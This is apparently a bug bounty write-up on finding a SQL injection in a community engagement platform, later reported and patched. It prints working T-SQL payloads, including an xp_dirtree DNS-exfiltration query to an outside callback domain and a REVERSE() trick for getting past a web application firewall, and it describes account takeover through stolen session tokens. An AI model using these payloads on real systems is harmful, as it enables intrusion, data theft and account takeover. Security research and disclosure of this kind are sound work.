Ever heard of backwards compatibility in a SQL injection vulnerability?

An Akamai web application firewall (WAF) was blocking my payload on two installations of a community engagement platform. Writing the command backwards got it past the firewall, leaving SQL Server to turn it around and run it.

This required the application to accept SQL through a filter parameter. Fortunately, that part had already been figured out.

## The filter

One Sunday night, while analyzing a domain within scope for a bug bounty program, my SQL injection scanner flagged a POST request containing this JSON:

```json
{"filter":"tag"}
```

A single quote appended to the end of `tag` caused a server error; using `tag'+'` instead got me a normal response. That pointed to SQL Server, where `+` concatenates strings. I found that `tag');-- -` was enough to close the original statement and comment out the rest, leaving room to add my own SQL.

The application would run the queries, but it wasn't putting their results in the HTTP response. I had a way to ask questions and no obvious way to read the answers.

So I borrowed a trick from [PortSwigger's SQL injection cheat sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet). SQL Server's `xp_dirtree` can trigger a DNS lookup when given a network path. If the hostname in that path contains a query result, the server discloses the result just by trying to resolve it.

I started with `DB_NAME()`, which returns the current database name, and a callback domain from [webhook.site](https://webhook.site/):

```sql
DECLARE @db VARCHAR(MAX) = DB_NAME();
EXEC('master..xp_dirtree "//'+@db+'.<webhook-id>.dnshook.site/a"');
```

For a database called `forum`, the server would perform a DNS look up for `forum.<webhook-id>.dnshook.site`. That request would appear in webhook.site's DNS logs, taking the database name with it.

That worked, although only on two of the four installations I was testing.

## A small compatibility issue

The remaining two instances were behind the WAF. By varying the request, I found that including `master..xp_dirtree` was enough to be met with a 403 Forbidden block page.

I was already building the command with string concatenation, so I tried splitting the procedure name: `'master..xp_'+'dirtree'`, `'mas'+'ter..xp_dirtree'`, and a few similar variations. None got through.

I tried `REVERSE()` next. That let me send `REVERSE('eertrid_px..retsam')` and have SQL Server turn it into `'master..xp_dirtree'` after the request had passed inspection.

I applied that to the whole command:

```sql
DECLARE @db VARCHAR(MAX) = DB_NAME();
DECLARE @cmd VARCHAR(MAX) = REVERSE(
  '''a/REVERSED-CALLBACK-DOMAIN.' + @db + '//'' eertrid_px..retsam CEXE'
);
EXEC(@cmd);
```

`REVERSED-CALLBACK-DOMAIN` is my callback domain written backwards. Reversing the assembled string puts the command and domain back in the right order, and `EXEC(@cmd)` runs the result.

This version got through, and the final two installations started sending DNS callbacks as well. For the example database `forum`, the log would show:

```text
A murof.<webhook-id>.dnshook.site.
```

In the webhook.site interface, that leading `A` indicates the DNS query type; `murof` is the database name in reverse. `@db` had gone into the string the right way round, so reversing the whole command reversed that value too. I just reversed the first label again when reading the logs.

I now had callbacks from all four installations.

## More than a database name

With that working, I started looking at what else I could retrieve. The database stored session tokens used for authentication. I recovered one for my own account and confirmed that it let me log in. A few clicks later, and I could change the registered email address. From there, I simply requested a password reset, and a password reset link was sent to the new email address. And just like that, I demonstrated impact: full account takeover for every account in the database.

Shodan also showed that the platform was in wider use. My initial search returned more than 50 websites running it. I narrowed that down to websites that had a responsible disclosure policy and started writing up my reports.

## The fix

I submitted reports to the vulnerability disclosure and bug bounty programs at Broadcom, IBM, ConnectWise, and one undisclosed organization. The reports were treated as high priority and passed to the third-party company that develops and operates the platform, which patched the SQL injection within days. The undisclosed organization also awarded a $500 bounty.

The WAF did what it was designed to do: it identified and blocked suspicious requests. But it couldn't address the underlying SQL injection, and a small change to the payload was enough to illustrate the limits of that protection.

Three independent controls would each have stopped this: parameterized queries (no injection), a least-privilege DB user (no `xp_dirtree`), and egress filtering on the DB server (no outbound DNS/SMB). The WAF was the only one present.
